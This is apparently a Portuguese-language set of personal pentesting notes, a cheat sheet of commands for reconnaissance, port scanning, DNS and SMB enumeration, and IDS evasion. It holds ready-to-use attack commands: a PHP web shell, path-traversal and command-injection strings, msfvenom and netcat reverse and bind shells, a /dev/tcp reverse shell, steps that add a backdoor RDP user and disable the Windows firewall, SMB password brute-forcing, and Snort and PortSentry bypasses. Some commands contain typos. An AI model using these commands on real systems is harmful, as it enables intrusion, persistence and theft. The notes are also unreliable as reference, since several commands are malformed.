Encontre aqui notas e comandos de um HACKER ÉTICO



COMANDOS RÁPIDOS


nmap -vvv  -sS --open -Pn -p- -T 5 <IP>



nmap -vvv -sV -sC -O -p -T 5 -A  --script vuln -Pn <PORTS> <IP>



gobuster dir -u http://HOST/ -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -a Mozilla/5.0 -x php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql



/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd



/../../../../../../../../../../etc/passwd



;dir;#



<script>alert('Pentester')</script>



<?php system($_GET['hacker']);?>



<?php system('id']);?>



msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext



python3 -c 'import pty;pty.spawn("/bin/bash")'



net user suporte 12345 /add

net localgroup "Remote Desktop Users" suporte /ad

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f


NetSh Advfirewall set allprofiles state off



.
.
.
.
.
.
.
.
.
.
.
.



VPN

Configurar a VPN para autenticar automaticamente usando login e senha em um arquivo externo, sendo lido pelo .ovpn. Na linha auth-user-pass informe o arquivo com as credenciais. Ex.: auth-user-pass credenciais

 - DOMINANDO TERMINAL LINUX

Tags: comandos terminal | comandos linux

    #ifconfig eth0 192.168.2.50 netmask 255.255..

modifica o IP até reiniciar a máquina

    #nano /etc/network/interfaces

arquivo de configuração das interfaces de redes

    #/etc/init.d/networking/ restart

reinicia o adaptador de rede para as configurações padrão PORÉM apenas se no arquivo interfaces estiver com DHCP, caso esteja com STATIC irá pegar o IP de lá.

    #route -n M

Mostra a rota atual e o GATEWAY

    #route del default

Delete a rota (GATEWAY) do adaptador de rede

    #route add default gw 192.168.1.1

Adiciona o IP da rota default

    #netstat 

Status da rede (detalhadamente usando as flags)

    #netstat -lntp

 Lista os serviços Portas Nomes no protocolo TCP rodando atualmente

    #service ssh start/stop/restart

Inicia ou para o serviço de SSH

    #vi

Leitor de texto. I: Insere dados; DD: Deleta a linha; WQ: Sai salvando; Q!: Sai sem salvar 

    #apt search php

Procure por opções de instalação do programa informado

    #dpkg -l

Exibe os pacotes .deb instalados com o DPKG

    #update-rc.d ssh enable

Habilita permanente o serviço ssh

    #locate #find /pasta/ -name #whereis #which 

Buscadores de arquivos/programas (updatedb atualiza base)

    #grep "procura" /arquivo/

Busca procura no arquivo e exibe a linha

    #grep -v "procura" /arquivo/ 

Exibe o que não tem procura no arquivo e exibe a linha

    #grep -r "palavra dentro do arquivo" 

Procura dentro dos arquivos dos diretórios as palavras nas "

    #awk -F : '{print "O usuario " $1 " Tem dir " $6}' /etc/passwd

Procura avançada no arquivo

    #cut -d : -f1,6 /etc/passwd 

Faz os mesmo do comando acima

    #sed 's/troca/porisso' do arquivo.txt 

Faz substituição de nomes nos arquivos usar ^ para add algo no início da cada linha

    #ls -la 

Exibe os arquivos ocultos

    #rm -rf nome-da-pasta 

Remove todos os arquivos da pasta


	- DOMINANDO O PROMPT DE COMANDO WINDOWS

Tags: criar usuarios cmd | comandos cmd | cmd windows

    >%cd% 

É semelhante ao pwd

    >cd \ 

        vai para raiz

    >echo ygor ygor.txt 

        cria arquivo com nome ygor dentro

    >type arquivo.txt

        semelhante ao cat

    >move arquivo.txt ../

        Move arquivo para pasta anterior

    >del arquivo.txt

        deleta arquivo

    >attrib +ou-h pasta/diretório

        ocultar/desocultar diretório

    >dir /a 

        lista arquivos ocultos

    >rmdir /s 

        Remove diretório

    >dir /s ygor.txt 

        Procura arquivo

    >tasklist

        Lista as tarefas 

    >net user

        Lista os usuários

    >net user usuario s3nh4 /add

        Adiciona um usuario

    >net user usuario /delete

        Remove usuario

    >net localgroup "Remote Desktop Users" kidman /add

        Add usuario ao grupo remote users


Adicionar usuários: https://ampliando.net/?p=491#:~:text=Para%20adicionar%20um%20usu%C3%A1rio%20de,computador%20estiver%20conectado%20%C3%A0%20rede.


    VISÃO GERAL SOBRE WEB E HTTP


Melhorar segurança servidor apache: 

    Remover do arquivo de configuração /etc/apache2.conf a palavra indexes nas confs do diretório /var/www/

    Trocar em /etc/apache2/conf-enabled/security.conf em ServerTokens de OS para Prod e em ServerSignature colocar Off

    #nc -v www.businesscorp.com.br 80 

        Printa o site no terminal

        Colocar na entrada da conexão GET / HTTP/1.0 ou no lugar de GET HEAD, OPTIONS

    printf "HEAD / HTTP/1.0\r\n\r\n" | nc businesscorp.com.br 80

        Faz a mesma coisa do comando acima

    curl -v businesscorp.com.br 

        Faz a mesma coisa do comando acima



    ANALISE DE LOGS


    #cat access.log | cut -d " " -f1 | sort | uniq -c | sort -unr 

        Lista os IPs em ordem decrescente por quantidade de requisição:

    cut -d " " -f1 

        -d é o delimitador e -f1 é a coluna que deseja imprimir

    sort 

        Printa a saída em ordem; -u printa única vez; -r ordem reversa; -n ordem cresc

    uniq -c 

        Printa a saída com a quantidade de vezes que um item aparece

    head -n1  

        Printa a primeira saída

    tail -n1 

        O oposto do head



    TCP/IP PARA PENTESTERS


    macchanger -t eth0

        Troca o MAC da placa randomicamente -p volta ao original

    ipcalc 192.168.0.211/255.255.255.0 

        Apresenta uma saída de cálculo de IP

    arp -an 

        Exibe informações guardadas  do ARP na máquina local



    ANALISADORES DE PROTOCOLOS


    printf  "%d\n" 0x(code hex) 

        Decifrar código em hexadecimal



Análise de código de um pacote

    Os 6 primeiros é o MAC de destino os 6 próximos é o MAC de origem os próximos 2 é o Protocolo o restante é o Payload:


    d4 ab 82 45 c4 0c 00 0c 29 76 43 e1 08 00 45 00

    02 37 2c c0 40 00 40 06 77 32 c0 a8 00 0a 25 3b

    ae e1 a9 fe 00 50 ff 4d 66 60 dd cb e4 96 80 18

    00 e5 96 f8 00 00 01 01 08 0a f7 cb 2f 62 41 1c

    2e df 50 4f 53 54 20 2f 69 6e 74 72 61 6e Payload... 


    Conversor de Hexadecimal -> https://en.rakko.tools/tools/77/

    Conversor de pacotes -> https://hpd.gasmi.net/

    Decifrador de códigos (CyberChef) -> https://gchq.github.io/CyberChef/

    Socket significa IP e porta 


Comandos úteis para Wireshark e TCPDUMP

    tcpdump -vvvxr monitoramento.pcapng 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' 

        Encontra as portas abertas Orig > Dest

    tcp contains "palavra desejada"

        Procura nos pacotes a "palavra desejada"

    tcp contains "%PDF-"

        Procura nos pacotes donwload do pdf

    ip.addr == 192.168.0.123

        Filtra os pacotes pelo IP

    Ip.connection.synack

        Filtra pacotes com FLAGs SYN e ACK

    tcp.port == 443

        Filtra a porta 443 nos pacotes capturados

    dns 

        Procura pacotes que usaram o serviço DNS




    BASH SCRIPTING (LINUX)


    #!/bin/bash

    #!/bin/sh


#Meu primeiro Script

echo "Imprime alguma coisa" # comando para imprimir uma saída

echo "tempo em que o PC está ligado: " $(uptime -p)

echo "diretório: " $(pwd)

echo "User: " $(whoami)

echo "Infome o IP"

read ip

porta=80

echo "varrendo o host: " $ip "Na porta: " $porta


echo "====================================="

echo "digite o serviço a ser iniciado"

read var1

service $var1 restart

echo "--------Serviços ativos------"

ps aux | grep $var1

echo "--------Portas abertas: -----------"

netstat -nlpt

echo {1..10} printa do 1 ao 10 (sequência)

seq 1 100 Printa sequencia de forma vertical 

for ip in {1..10}; do echo 192.168.2.$ip;done

while true; do echo "Hacked"; done

sed 's/.$//' Substitui o último caractere

hping3 -S -p 80 -c 1 host Pingar porta específica

1> STDOUT

2> STDERR

0>  STDIN

grep "href" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | grep -v "<li" > parsinglist

for url in $(cat parsinglist);do host $url | grep -v "NX";done

for ip in $(cat hostsativoVPNdesec);do hping3 -SA -p 1337 $ip;done                                                                                                                                      

Port Knocking: https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/

knock 192.168.0.20 254 785 135 -d 500


    POWERSHELL PARA PENTESTERS


Script POWER SHELL

param($param1)

if ("!$param1"){

    echo "Digite um Parâmetro para leitura"

}else{

    ping -n 1 $param1 | Select-String "bytes=32"

}

echo "Ygor Offencive Security Expert"

$nome = Ygor

echo "Qual seu nome: $nome"

$ip = Read-Host "Digite o IP:"

$port = 443

echo "Varrendo o host: $ip na porta: $port"

echo "Executando pinga no host informado"

ping -n 1 $ip | Select-String "bytes=32"

foreach ($var1 in 1..10) {echo 10.0.0.$var1}

param($p1)

foreach ($ip in 1..254){

ping -n 1 $p1.$ip | Select-String "bytes-32"

}

Comandos Windows equivalentes no LINUX

    Tratamento de erro: try catch

    Negação ou ausência no IF é !

    Semelhante ao GREP: Select-String "bytes=32"

    Semelhante ao CUT -D: $resp.Line.split(' ')[2] -replace ":"," "


Port Scan on PowerShell

param($ip)

 if (!$ip){

        echo "Tratativa de erro"

        echo "Informe o Host"

}else{

$topports = 21,22,3306,80,443

try{foreach ($porta in $topports){

if (Test-NetConnection $ip -port $porta -WarningAction SilentlyContinue -InformatioLevel Quiet)

        echo "Porta $porta Aberta"

}} else {

        echo "Porta $porta Fechada"

}} catch {}

}

Comandos POWERSHELL WEB

Invoke-WebRequest www.businesscorp.com.br -OutFile index.txt

            -Method options/header

(Invoke-WebRequest www.businesscorp.com.br).statuscode/content/links.href/header.server


    SWISS ARMY KNIFE


Netcat é o famoso canivete suíço

    nc 192.168.2.1 80 

        Conexão usando NETCAT

    nc -vnlp 8080 

        (verbose|não traduz IP|listening|port) Abrindo uma porta usando

    nc -vnlp 80 < banner

         Abre a porta 80 e carrega o arquivo quando fechado o netcat

    nc -vnu 192.168.2.1 80 

        Conexão usando NETCAT

    nc -vnlup 8080

        (verbose|não traduz IP|listening|udp|port) Abrindo uma porta usando


Copiando arquivos entre hosts com o NETCAT

    nc -vnlp 5050 < arquivo.ext 

        Abre a conexão com o nome do arquivo que vai receber.

    nc -v 192.168.0.10 5050  < arquivo.ext 

        Conecta enviando o arquivo para a porta aberta do destino.

    du -h arquivo.ext 

        Verifica o tamanho do arquivo enviado e compara para certificar a integridade.


Port Scanning

    nc -vnz 192.168.0.10 80 

        Escaneia a porta 80 do IP

    nc -vz www.businesscorp.com.br 80  

        Escaneia a porta 80 do site

    nc -vnz 192.168.0.10 20-1024 

        Escaneia da porta 20 à 1024

    for ip in $(cat portlist);do nc -vnz 172.16.1.5 $ip;done 

        PortScan usando um arquivo


HoneyPot

    while true;do sudo nc -vnlp 21 < 21.txt 1>> log21.txt 2>> log21.txt; echo $(date) >> log21.txt;done

        Comando para abrir a porta 21 e monitorar com banner e captura de logs

    nc -vnlp 21& 

        Abrir porta e deixar em background (dentro de script)


Nota: Bind Shell x Reverse Shell: Bind abre a porta no servidor alvo e Reverse abre a porta na máquina atacante!

    nc -vnpl 5050 -e /bin/bash 

        BIND SHELL disponível para conexão no Linux

    nc -vnpl 5050 -e cmd.exe 

        BIND SHELL disponível para conexão no Windows

    nc -vn 192.168.0.1 5050 -e cmd.exe 

        REVERSE SHELL disponível para conexão no Windows

    nc -vn 192.168.0.1 5050 -e /bin/bash 

        REVERSE SHELL disponível para conexão no Linux

 Nota:	É possível usar uma porta que esta com o status fechada no nmap e burlar o firewall

    	É possível conectar com reverse shell quando o firewall bloqueia no servidor qualquer conexão de entrada

    	Com o firewall bloqueando entrada e saída, abre uma porta no atacante que já está aberta no alvo e conecta o alvo via reverse no atacante. 

Ncat

    openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10

        Criando certificado ssl para a comunicação no NCat.

    ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem

        Abre a porta de forma criptografada --allow 192.168.0.5 (permite conexões apenas do host informado).

    ncat -vn 192.168.2.200 8443 --ssl 

        Conectando de forma encriptada.


Socat

    socat tcp4-listen:2222 

        Alternativa para netcat o - serve para não precisar passar os dois endereços

    socat tcp4:192.168.2.106:555

        Conectando na porta do alvo

    socat tcp-listen:4444 EXEC:/bin/bash

        Ganhando acesso ao shell


Telnet

    telnet www.businesscorp.com.br 80 21

        Opção alternativa ao NC, ftp...


Alternativa para conexão reversa usando telnet:

Abrir duas portas na máquina atacante 4444 e 4445 e executar o comando no alvo: telnet 172.23.58.96 4444 | /bin/bash | telnet 172.23.58.96 4445

DEV/TCP

    echo "Mensagem" > /dev/tcp/192.168.2.106/4444 

        Conecta com o host com a porta aberta


     >/dev/tcp/192.168.2.106/4444 && echo "Porta aberta" 

        PortScan

    bash -i > /dev/tcp/192.168.2.106/4444 0>&1 2>&1 

        Envia o bash para o destino e os erros e saídas aparecendo para o destino



    INFORMATION GATHERING - BUSINESS


    hunter.io 

        Procura por emails apenas informando o domínio do site.

    http://pwndb2am4tzkvold.onion

        procura por dados em LEAKS


    Usando TOR no firefox

        Instala o tor e proxychains, no arquivo de configurações do proxychains adiciona a linha do socks5 e no firefox add o ip e porta do proxy.

    https://github.com/jdiazmx/karma 

        Consulta local de LEAKS com TOR instala o KARMA inicia o TOR e usa para consultar LEAKS

    site:pastebin.com "senhas" 

        Procura por palavras "senhas" no site pastebin

    site:trello.com "senhas" 

        Procura por palavras "senhas" no site pastebin

    urlcrazy domainname.com 

        Procura domínios similares ao da entrada


Google Hacking:

    filetype: intext: inurl: :.com.br 

        Google hacking para pesquisas avançadas

    cache: url.com.br/do/site/indisponível

        Pesquisa o cache do site que não está mais disponível 

    exploit-db.com/google-hacking-database 

        Base de pesquisas no google Dorks

    firefox 'https://google.com/search?q=site:site.com.br+inurl:exemplo' 

        URL comando para google hacking

    lynx site.com 

        Navegador por linha de comando

    iana.org/whois 

        Procura por endereços direto da fonte na IANA

    lynx --dump 'https://google.com/search?q=site:site.com.br+ext:pdf'  

        Faz um dump com o navegador com linha de comando por PDF

    wget -q 

        Não apresenta a saída

    whois -h iana.org/whois site.com.br 

        Força usa a iana na pesquisa

    Client.rdap.org

        Alternativa para o whois 


Nota: ASN e NETBLOCK Asn é um provedor que precisa de vários netblocks (Blocos de IP)

    INFORMATION GATHERING INFRA


Mapear bloco de IP do alvo: search.arin.net/rdap/ OU WHOIS com IP

    inetnum é o bloco de ip

    aut-num é o ASN (caso tenha)

Não retornando nada pode ser que o IP apresentada não pertença à empresa nesse caso com o host pega-se a segunda saída e verifica o IP

Border Gateway Protocol (bgp.he.net e bgpview.io, praticamente tudo está aqui)

Shodan

	Pesquisa avançada por domínios, portas, IPs, câmeras, espalhadas pelo mundo

    hostname: Nome do site

    os: Sistema operacional

    port: Porta

    IP: IP

    net Busca por rede

    country: País

    city:  cidade

    geo Geolocalização

    org Por uma organização

    "": Procura por termo


    shodan init chaveapi 

        Inicia uma sessão via terminal do Shodan 12

    shodan count country:br port:445 contabilidade 

        Procura e mostra a quantidade de host disponíveis

    shodan search --fields ip_str,org,port,hostnames country:br port:445

    shodan host 201.147.25.236


Censys

Basicamente a mesma função do SHODAN

    location.country_code: BR AND metadata.os: windows 80.http.get.title: TI 

        Busca no Censys parecida com as buscas feitas no shodan


Domain Name System

    #host -t A site.com 

        Busca IPv4

    #host -t mx site.com 

        Busca informações do servidor de EMAIL

    #host -t ns site.com 

        Servidores primarios e secundarios ou mais

    #host -t hinfo site.com

        Informações do site

    #host -t aaaa site.com 

        Retorna infor do IPv6

    host -t txt site.com 

        Retorna strings em texto info do TXT com configurações do SPF (email) 

    Host for server in $(host -t ns businesscorp.com.br | cut -d " " -f7);do host -l -a businesscorp.com.br $server;done 

        Verificando vulnerabilidade de transferência de zona no DNS com o comando 

    for domain in $(cat wordlist.txt);do host -t a $domain.site.com.br | grep -v "NXDOMAIN";done

        Descoberta de HOST por Brute Force

    for ip in $(seq 220 239);do host 37.59.174.$ip;done

        Descoberta de Domínios por IP

    host -t txt desec.com.br 

        Irá retornar os códigos do SPF sabendo se é vulnerável ou não então, realizar teste de envio spoofing: Email Sender: https://emkei.cz/


SPF = Verifica quais servidores estão autorizado enviar emails em seu domínio

?all Libera tudo

~all Libera mas com alerta de perigo

-all recomendado

Subdomain Takeover

    host -t cname businesscorp.com.br

        Verifica para onde aponta o Alias possibilitando testar se o Alias existe ou não, podendo assim registrar se possível e ter domínio sobre o registro apontado.

    host -t hinfo businesscorp.com.br

        Verifica mais informações do domínio apresentado.

    for domain in $(cat wordlist.txt);do host -t cname $domain.$1 | grep "alias for";done

        Apresenta os CNAMEs (ALIAS) do SubDomínio encontrado, podendo ou não ser vulnerável.

    dig -t ns site.com.br 

        Alternativa do comando host

    dig -t  axfr site.com $ns2.site.com 

        Semelhante ao host, faz a tentativa de transferência nos srv de name servers


Ferramentas de Enumeração já pronta

    dnsenum site.com 

        Enumeração de DNS, brute force etc.

    dnsrecon site.com 

        Apresenta as possíveis vulnerabilidades do domínio

    fierce -dns site.com  

        Apresenta as possíveis vulnerabilidades do domínio com bruteforce


    Pesquisa passiva sobre domínio

        Virus Total: https://www.virustotal.com/gui/home/upload

        DNS Dumpster: https://dnsdumpster.com/

        Security Trails: https://securitytrails.com/


    Sites de análises de certificado pesquisas por possíveis subdomínios vulneráveis

        CRT SH: https://crt.sh/

        Transparency Report: https://transparencyreport.google.com/



    INFORMATION GATHERING WEB


    robots.txt e sitemap.xml

        Contém informações de links das páginas do site, em Robots contém as páginas que não são indexadas pelo google.

    wget -m site.com 

        Mirror website, copia todos os arquivos e páginas para a máquina (clona website).

    wget -m -e robots=off  site.com 

        Mirror website, copia todos os arquivos e páginas para a máquina (clona website) sem se importar com o arquivo robots.

    nc -v site.com 80 HEAD / HTTP/1.0 host:site.com 

        Comando serve para testar um domínio específico quando há vários no alvo.

    dirb website.com

        Faz bruteforce de diretórios  /caminho/da/wordlist/

    dirb website.com -a agenteoculto -X .php 

        Faz bruteforce de diretórios sem ser percebido

    curl -v site.com.br 

        Faz um CURL do site com verbose

    curl -I site.com.br/asdaf.aspx 

        Força mostrar o banner com a versão do ASP.NET PHP JS...

    curl -v -H "User-Agent: Desec Tool" site.com.br 

        Burlando o user agent

    curl -s -o /dev/null -w "%{http_code}" businesscorp.com.br 

        Pegando o código da requisição

    curl -v imap://camila:ca123456@email.site.com.br/INBOX?NEW 

        Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa

    whatweb site.com.br 

        Faz uma busca geral no site e traz informações importantes -v verbose

    whatweb -v --user-agent 'nome aleatorio' site.com 

        Wappalyzer Plugin para pegar informações do site como banco, linguagem, tecnologias em geral




    SCANNING


    traceroute site.com 

        Faz uma análise de saltos do host. -w tempo de espera, -m Máximo de saltos, -f início da contagem dos saltos, -A indica os ASs dos hosts -n não Nomeia os hosts, -I usar o ICMP, -T TCP, -p porta do alvo, -U UDP na porta 53

    iptables -nL 

        Lista as regras do iptables

    iptables -F 

        Limpa as regras do iptables

    iptables -P INPUT DROP 

        Dropa todos os pacotes na corrente de entrada  

    iptables -A INPUT -p tcp --dport 80 -s 192.168.2.20 -j ACCEPT 

        Libera o acesso apenas do host informado na flag -s na porta 80, regra de entrada. --reject-with tcp-reset Dribla o nmap com a reason reset

    fping -a -g 192.168.2.0/24 

        Varre toda a rede com o ICMP a fim de mostrar os hosts ativos.

    arping -c 1 192.168.2.10 

        Semelhante ao ping para descobrir hosts com block ping na rede 

    arp-scan -l  

        Varre os hosts já identificados

    tcpdump -vn -i wlan0 host 192.168.2.10 and 192.168.2.10  

        Escuta a comunicação de dois hosts

    nmap -sn 192.168.2.10 

        Varrer o hosts e saber se está ativo ou não

    nmap -sn 192.168.2.10 -oN normal.txt 

        Varrer o hosts e saber se está ativo ou não e salvar em um arquivo, N normal, X xml e G grapable possibilitando usar filtros.

    nmap -sS -p 80 -Pn 192.168.2.10 --reason 

        Retorna se a porta 80 está aberta ou não mostrando a razão


Nota: 	TCP connect envia RESET depois do 3WHS

No firewall, o certo é bloquear tudo e liberar apenas o que é necessário

Nmap em /usr/share/nmap/scripts É encontrado vários scripts para uso em diversos serviços.

No ping pode-se usar o -w 1 para ser feito o ping mais rápido

    nmap -sT -p 80 site.com 

        Exemplo de TCP Connect (PortScan)

    nmap -v -sTV -p 69 site.com 

        Exemplo de TCP Connect Scan Port ENUMERATION - Banner Grab

    HalfOpen/Syn Scan 

        Envia um RESET depois de SYN/ACK do host

    nmap -sS --top-ports=5 site.com 

        Exemplo de HalpOpen

    Flags NMAP: -sF  

        Envia flag FIN para o host e retorna open|filtered, Semelhante ao -sN 

    iptables -nvL 

        Saída mais detalhada com o consumo de Bytes

    iptables -A INPUT -s 192.168.2.102 -j ACCEPT

        Grava os pacotes de entrada do host em -s

    iptables -A OUTPUT -d 192.168.2.102 -j ACCEPT

        Grava os pacotes de saída do host em -d

    iptables -Z

        Zera todas os registros de Bytes gravados

    nmap -v -sU -p 69 site.com

        Exemplo de UDP Connect Scan Port

    nmap -v -sUV -p 69 site.com

        Exemplo de UDP Connect Scan Port ENUMERATION

    hping3 --udp -p69 192.168.2.102

        Exemplo de UDP Connect Scan Port


Network Sweeping

    nmap -v -sn 192.168.2.0/24 -oG ativos.txt 

        Coloca os hosts UP e Down no arquivo ativos.txt

    grep "up"cut -d " " ativos.txt  | cut -d " " -f 2 > hosts 

        Filtra pelos hosts UP e coloca em hosts 

    nmap -sS -p 80 --open -Pn -iL hosts -oG web.txt 

        Ler hosts da lista e apresenta os com port 80 open

    nmap -sSV -p 80 --open -Pn -iL hosts -oG web.txt 

        Banner grabbing das portas abertas

    grep "Apache" web.txt 

        Filtro pelo serviço da porta

    nmap -sS -p 139,445 --open -Pn -iL hosts -oG share.txt 

        Varre os hosts com as portas e salva em share

    nmap -sS -p 21,22,23,3389 --open -Pn -iL hosts -oG remote.txt 

        Varre portas e salva em remote

    nmap -sS -p 3306,1433 --open -Pn -iL hosts -oG db.txt   

        Varre portas e salva em db

    nmap -sS -p http* --open -Pn iL hosts -oG coringa.txt  

        Varre portas com coringa e salva em coringa


Identificando serviços

    nmap -v -sV -Pn 172.16.1.2 

        Pegando o Banner de todas as portas abertas


Enganando o atacante

Nota: /etc/services -> mostra os serviços e as suas respectivas portas padrões

    nano etc/ssh/sshd_config 

        Acessa e modifica a porta para enganar o atacante.

    sudo apt install bless 

        Programa para alterar códigos em hexadecimal.

    cp usr/sbin/sshd /home/user/desktop 

        Cópia de segurança do arquivo. Procura pelo banner e altera para enganar o atacante.


OS Fingerprinting

    Parâmetros que podem identificar um Windows: 

        RDP.3389-Implementação da pilha TCP/IP-NMAP -O / -A

    Identificar o SO pelo TTL (caso esteja padrão)

        Win ttl 128 

        Linux ttl 64 

        FreeBSD ttl 64 

        Solaris ttl 255 

        CISCO ttl 254


Conectando e lendo mensagens de email via comando

IMAP

    nc - v mail.servidor.com 143 

        Conecta-se ao servidor de email

        A1 login usuário s3Nh4  autentica no servidor após conectado

        g21 SELECT "INBOX" 

        Printa as respostas sobre a caixa de entrada

        F1 fetch 1 RFC822 

        Lista a mensagem 1

        s search draft 

        Procura pelos rascunhos


    curl -v imap://camila:ca123456@email.site.com.br/INBOX?NEW 

        Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa


POP 

    nc -v mail.servidor.com 110 Conecta com o servidor de email POP

        USER username Usuário da conta

        PASS password Senha da conta

        LIST Lista a quantidade mensagens e o tamanho

        STAT Apresenta as quantidade de mensagem

        RETR 1 Ler a mensagem 1


SMTP

    nv -v 192.168.2.101 25 Conecta na porta SMTP

        HELO Lista info do servidor

        EHLO Lista comandos aceitos e mais infos do server

        HELP Lista os comando aceitáveis pelo servidor

        VRFY root Ele informa se o usuário root existe ou não

        mail from: pentest Envia email usando o servidor

        mail to: root Destinatário do email com o assunto posteriormente e com verificação de user existente

        DATA ... Digita a mensagem e finaliza com um ponto e enter


    BURLANDO MECANISMOS DE DEFESA


    NMAP -v -sS -g 53 192.168.2.10 

        Encontrar Portas filtradas pelo firewall. O -g podendo ser trocado por --source-port, é a mesma coisa. Para interagir com a porta descoberta rode nc -vn -p 53 192.168.2.10 8081  e capture o banner! Ou podendo enviar a saída para um arquivo > /var/www/html/recon.html  


    snort -A fast -q -h 192.168.2.0/24 -c snort.conf 

        Monitorar em tail -f alert /var/log/snort/ 

    snort -A console -q -h 192.168.2.0/24 -c snort.conf 

        Habilita o IDS e já monitora 


Arquivos de regras do snort

    alert tcp any any -> 192.168.2.105 any (msg: "Tão te atacando";sid:1000001; rev:1;) 

        Cria arquivo com .rules onde o primeiro any é a origem e o segundo a porta de origem o terceiro a porta de destino o IP é da sua máquina. O path do arquivo deve ser adicionado em snort.conf no final.

    alert tcp any any -> 192.168.2.105 22 (msg: "Pacote SYN enviado ao SSH";flags:S;sid:1000001; rev:1;) 

        Exemplo de portas específicas e filtros de flags. SYN como no setado acima.

    alert tcp any any -> 192.168.2.105 80 (msg: "Acesso ao arquivo robots.txt";content:"robots.txt";sid:1000001; rev:1;) 

        Exemplo de portas específicas e filtros de conteúdos. robots.txt como no setado acima.

    alert tcp any any -> 192.168.2.105 80 (msg: "Possivel SQL Injection";content:"%27";sid:1000001; rev:1;) 

        Exemplo de portas específicas e filtros de conteúdos. %27 como no setado acima.


Bypass SNORT

Nota: 	Pegando o exemplo do ICMP, o SNORT captura os pacotes e alerta, o ideal é pegar o arquivo de regras no SNORT e analisar cada alerta emitida no ping.

	Analisar as regras para saber como burlar as mesmas com outros mecanismos.

    ping -c1 -p "6568674124" 192.168.2.105 

        Burlando os dados do pacote enviado passando hex diferente

    hping3 -c1 -C 8 -K 1 --icmp 192.168.2.105 

        Burlando o código do pacote burlando a regra icode para 1

    hping3 -c1 -C 8 -K 1 -d 23 --icmp 192.168.2.105 

        Burlando o tamanho dos dados para não ser detectado


PortSentry simula portas abertas no host. No portsentry.conf tem as portas que deseja abrir, e a ação a ser tomada quando detectado a intrusão. Marca a opção TCP e UDP como 1 para fazer valer as regras de bloqueio. Habilita ou desabilita a ação padrão ou usa a do IPTABLES

Nota: saída do banner na porta como tcpwrapped é geralmente quando tem algum IPS/IDS/FW bloqueando

Se fizer o escaneamento usando a flag do NMAP -sS o IPS não detecta... Para o IPS detectar deve ser modificando o binário do portsentry em /usr/sbin/portsentry executando com a flag -stcp dessa forma fazendo o atacante ser bloqueado.

Nota: 	Flag nmap -T é a velocidade das requisições 0,1,2,3,4 e 5 do mais lento para o mais barulhento.

Analisar os arquivos hosts.deny em ETC para ver se tem algum bloqueio de IP.

	Bypass PortSentry mesmo com -STCP ativado

    nmap -sS --open --top-ports=10 -Pn 192.168.2.105

        Analisa as 10 top ports, caso uma dessas portas não esteja configurado no IPS para detectar, caso contrário irá detectar. Podendo aumentar ou diminuir o tempo de processamento do scanner com a flag -T. Flag -D (decoy), Exemplo: nmap -sS --open --top-ports=25 -Pn -D 10.10.2.4,192.168.25.25,10.0.0.14 192.168.2.105 Ou -D RND:50 Pegando 50 endereços aleatórios para misturar



    TRABALHANDO COM SCAPY


    ls(IP)

        Lista as opções customizáveis do pacote IP (TCP)

    pIP = IP(dst="192.168.2.1")

        Cria variável com o ip de destino.

    pIP / pIP.show() / pIP.summary 

        Lista o pacote/variável criado(a)

    pTCP = TCP(dport=80, flags="S") 

        Cria o pacote TCP

    pTCP.dport=80, 443, 9090 

        Adiciona mais portas ao pacote TCP

    pTCP.sport=457889 

        Porta de origem no pacote TCP

    pacote = pIP/pTCP

        Formando o pacote TCP/IP

    sr1(pacote)

        Enviando Um pacote TCP/IP

    sr(pacote)

        Enviando vários pacotes TCP/IP é o exemplo de várias portas

    resposta = sr1(pacote)

        Grava em resposta a saída do envio do pacote

    resposta.show()

        Mostra a variável criada

    resposta[IP].dst

        Mostra o atributo dst do pacote IP

    resposta[TCP].flags

        Mostra o atributo flags do pacote TCP

    resp, noresp = sr(pacote)

        Grava em resp e no respe as respostas e não respostas respectiv

    pacote = pIP/ICMP()/"DESEC"

        Pacote ICMP com payload "DESEC"

    pacote = pIP/pTCP/"Desec"

        Pacote TCP com payload "Desec"


Nota: Requisição de conexão HTTP OPTIONS retorna os métodos de requisições aceitos pela aplicação. Na requisição colocando 1.1 no HTTP é possível especificar o HOST para ir direto ao domínio

    ENUMERATION


    openssl s_client -quiet -connect www.tesla.com:443 

        Faz uma conexão de forma segura com criptografia seguido do HEAD / HTTP/1.1 HOST www.tesla.com recomenda-se usar o HTTP 1.1

    wafw00f tesla.com 

        Identificando o firewall que a aplicação está utilizando

    ftp host.com 

        Conexão FTP com o servidor passando login e senha | anonymous anonymous, ftp ftp comando passivo habilita o modo passivo podendo listar os arquivos


Nota:	Porta 139 NetBios porta mais antiga

Porta 445 SMB serviço mais atual

ENUMERANDO SMB NO CMD	

    nbtstat -A 192.168.2.101 

        Retorna informações da máquina como nome, grupo etc...

    net view \\192.168.2.101 

        Lista os arquivos compartilhados do host

    net use \\ 192.168.2.101 "" /u:"" 

        Tenta estabelecer um NULL Session (sem user e pass) no netbios

    nbtstat -c 

        Mostra o cache das buscas realizadas

    net use h: \\192.168.2.101\filename 

        Monta o compartilhamento no H

    net use h: /delete 

        Deleta o compartilhamento montado

    for /f %i in (wordlist.txt) do net use \\192.168.2.101 %i /u:usr 

        Brute force smb no CMD

    for /f "tokens=1,2" %i in (wordlist.txt) do net use \\192.168.2.101 %j /u:%i 

        Brute force smb no CMD com login e senha


Enumerando SMB no terminal

Alternativa nmblookup

    nbtstat -r 192.168.2.0/24

        Procura por hosts com compartilhamento de arquivos ativos

    smbclient -L \\192.168.2.101

        Lista os arquivos do host com smb ativo -N Loga como usuário anônimo -U para passar um usuário sem senha. Se usando uma ferramenta mais recente em hosts antigos use o parâmetro --option='client min protocol=NT1'

    smbcliente //192.168.2.101/filename 

